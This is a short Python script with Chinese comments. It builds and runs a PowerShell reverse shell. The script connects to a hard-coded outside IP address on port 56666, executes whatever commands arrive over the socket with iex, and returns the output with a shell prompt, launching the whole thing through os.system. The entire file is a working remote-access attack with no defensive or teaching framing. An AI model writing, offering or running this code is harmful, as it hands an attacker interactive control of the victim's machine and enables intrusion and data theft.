import os

# 替换为你的目标 IP 地址和端口号
target_ip = "38.54.57.42"
target_port = 56666

# 构造命令字符串
command = f"cmd /c powershell -c \"$client = New-Object System.Net.Sockets.TcpClient('{target_ip}',{target_port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}}\""

# 执行命令
os.system(command)
